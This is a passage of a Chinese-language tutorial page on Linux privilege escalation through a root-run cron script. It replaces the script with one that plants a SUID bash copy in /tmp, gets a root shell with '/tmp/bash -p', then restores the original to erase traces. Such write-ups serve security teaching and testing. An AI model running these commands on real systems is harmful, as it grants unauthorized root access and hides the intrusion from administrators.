<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /opt/scripts/test-connect.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113603626-2025232404-3ee3931d34bd5691cfab53999f0ece3d.png" width="473" height="140" class="img_ev3q"></p>
<p>好吧，这只是一个简单的脚本，它使用 if/else 语句来检查网络是通还是断。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="84设置漏洞并获取-root-shell"><strong><div id="id8.4">8.4、设置漏洞并获取 Root Shell</div></strong><a href="#84设置漏洞并获取-root-shell" class="hash-link" aria-label="84设置漏洞并获取-root-shell的直接链接" title="84设置漏洞并获取-root-shell的直接链接">​</a></h4>
<p>无论它做什么，我们都无法对其进行编辑，因此我们将把原始脚本移动到一个我们可以写入的目录中，然后用恶意版本替换该脚本。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mv /opt/scripts/test-connect.sh /dev/shm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547417-866203057-41ade9c489203d6262f5a08df612a262.png" width="571" height="91" class="img_ev3q"></p>
<p>有趣的是，一旦文件被移动，devops 将成为文件所有者。这意味着我们可以在移动脚本后对其进行编辑，然后将其移回原始文件夹。</p>
<p>相反，我们将继续执行原计划，用恶意脚本替换当前脚本。</p>
<blockquote>
<p><strong>为什么文件在移动时不属于 root？</strong> 这是由于DevOps 在移动文件时，ACL 阻止文件归 root 所有；因此，系统被迫让 DevOps 成为“新”文件的所有者。最简单的理解是，DevOps 无法将 root 指定为文件所有者；但是，root 可以将任何用户指定为文件所有者。</p>
</blockquote>
<p>由于我们已经使用 cron 作业以 4 种不同的方式获取 root 身份，因此这次我们将保持简单并在 /tmp 文件夹中创建另一个 SUID bash 二进制文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;#!/bin/bash&#x27; &gt; /opt/scripts/test-connect.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;&quot; &gt;&gt; /opt/scripts/test-connect.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash&#x27; &gt;&gt; test-connect.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113553202-397053965-384ff000795156cd0dc4ecd0d4649a97.png" width="762" height="127" class="img_ev3q"></p>
<p>不到一分钟，/tmp 目录中就会出现一个新的 SUID bash 二进制文件！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547517-1390036696-b2701b0f58065c0d6a2a6a6158465940.png" width="871" height="154" class="img_ev3q"></p>
<p>由于 bash 二进制文件归 root 所有，我们可以使用它轻松进入 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/bash -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547438-721717965-5da781805ad43b7a213483be21cf2943.png" width="809" height="95" class="img_ev3q"></p>
<p>最后，不要忘记清理脚本并从备份中恢复它并再次让 root 成为所有者！</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mv /dev/shm/test-connect.sh /opt/scripts/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chown root:root /opt/scripts/test-connect.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113601112-1458694767-4f5f2e183a0a4b05b864574671462953.png" width="494" height="367" class="img_ev3q"></p>
<p>太棒了！现在一切都恢复了原样，就像我们从未来过一样！</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权-Capabilities</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux 提权-Docker 容器</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1什么是-cron-job" class="table-of-contents__link toc-highlight"><strong><div>1、什么是 Cron Job？</div></strong></a></li><li><a href="#2寻找-cron-任务---手动方法" class="table-of-contents__link toc-highlight"><strong><div>2、寻找 Cron 任务 - 手动方法</div></strong></a></li><li><a href="#3寻找-cron-任务--linpeas-方法" class="table-of-contents__link toc-highlight"><strong><div>3、寻找 Cron 任务 – LinPEAS 方法</div></strong></a></li><li><a href="#4利用-cron-jobs--cron-path" class="table-of-contents__link toc-highlight"><strong><div>4、利用 Cron Jobs – Cron PATH</div></strong></a></li><li><a href="#5利用-cron-jobs--弱文件权限" class="table-of-contents__link toc-highlight"><strong><div>5、利用 Cron Jobs – 弱文件权限</div></strong></a></li><li><a href="#6利用-cron-jobs--弱目录权限" class="table-of-contents__link toc-highlight"><strong><div>6、利用 Cron Jobs – 弱目录权限</div></strong></a></li><li><a href="#7利用-cron-jobs--tar-通配符注入" class="table-of-contents__link toc-highlight"><strong><div>7、利用 Cron Jobs – tar 通配符注入</div></strong></a></li><li><a href="#8利用-cron-jobs--隐藏的-cron-jobs" class="table-of-contents__link toc-highlight"><strong><div>8、利用 Cron Jobs – 隐藏的 Cron Jobs</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>